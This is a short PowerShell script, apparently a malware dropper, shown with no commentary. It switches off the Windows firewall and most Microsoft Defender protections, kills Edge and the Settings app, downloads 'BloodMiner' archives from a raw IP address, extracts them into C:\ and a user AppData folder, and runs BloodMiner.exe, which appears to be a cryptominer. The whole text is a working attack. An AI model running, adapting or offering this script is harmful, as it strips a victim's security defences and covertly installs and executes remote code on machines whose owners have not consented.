netsh advfirewall set allprofiles state off
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
taskkill /F /IM MicrosoftEdge.exe /T
taskkill /F /IM SystemSettings.exe /T
Import-Module BitsTransfer
Start-BitsTransfer -Source http://139.180.134.229/BloodMiner.Zip -Destination C:\BloodMiner.Zip
Start-BitsTransfer -Source http://139.180.134.229/BloodMiner.exe_Url_cg2ib1rovxncy5wjo42qppm3tgybicjg.Zip -Destination C:\BloodMiner.exe_Url_cg2ib1rovxncy5wjo42qppm3tgybicjg.Zip

Expand-Archive -Path C:\BloodMiner.Zip -DestinationPath C:\BloodMiner
Expand-Archive -Path C:\BloodMiner.exe_Url_cg2ib1rovxncy5wjo42qppm3tgybicjg.Zip -DestinationPath C:\Users\$env:username\AppData\Local\BloodLand_Foundations\BloodMiner.exe_Url_cg2ib1rovxncy5wjo42qppm3tgybicjg

Start-Process -FilePath "C:\BloodMiner\BloodMiner.exe"